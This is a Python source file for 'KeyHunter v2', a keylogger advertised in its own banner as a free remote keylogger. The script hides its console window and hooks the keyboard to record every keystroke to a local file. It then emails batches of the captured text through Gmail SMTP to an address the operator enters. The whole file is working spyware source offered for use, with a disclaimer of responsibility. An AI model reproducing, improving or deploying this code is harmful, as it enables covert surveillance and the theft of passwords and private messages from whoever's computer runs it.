import win32api
import win32console
import win32gui
import pythoncom,pyHook
import time
import datetime
import smtplib
from email.mime.text import MIMEText
import os

########################################################

# SET UP VARIABLES

########################################################

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
#create .txt file where keystrokes will be stored
f=open('c:\output.txt','w+')
f.close
email = str(raw_input("# Enter Your Email Address : "))



desc = '''
        +=========================================+
        |..........KeyHunter v2...................|
        +-----------------------------------------+
        |#desc: KeyHunter is free remote keylogger|
        |#Author: Ivan Blazevic                   |
        |#Contact: hackspc@gmail.com              |
        |#Date: 3/04/2014                         |
        |#Changing the Description of this tool   |
        |Won't made you the coder ^_^ !!!         |
        |#Respect Coderz ^_^                      |
        |#I take no responsibilities for the      |
        |  use of this program !                  |
        +=========================================+
        |..........KeyHunter v 2..................|
        +-----------------------------------------+
'''
print desc


########################################################

# FUNCTIONS

########################################################

def send_email(message,toaddrs):

    try:
        

        fromaddr = 'keyhunter.hackspc@gmail.com'
        username = 'xxxxxx'
        password = 'xxxxxx'
        message+="<br><br>" +"BR KeyHunter Team "
        msg = MIMEText(message, 'html')
        msg['Subject']  = "KeyHunter Report -- " +str(datetime.datetime.now()) + " --"
        msg['From']=fromaddr
        msg['Reply-to'] = 'no-reply'
        msg['To'] = toaddrs
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, [toaddrs], msg.as_string())
        server.quit()
    except:

        print "Error while sending email!!!Contact support hackspc@gmail.com!"
            
          

def OnKeyboardEvent(event):
    
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        #open output.txt to read current keystrokes
        f=open('c:\output.txt','r+')
        buffer=f.read()
        f.close()
        if len(buffer)%1001==0:
            #send last 10000 characters
            send_email(buffer[-10000:],email)
        #open output.txt to write current + new keystrokes
        f=open('c:\output.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()
        #after specific number of charachters send email
        
            
        
########################################################

# BEGIN EXECUTING KEYHUNTER v2 

########################################################



                    
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
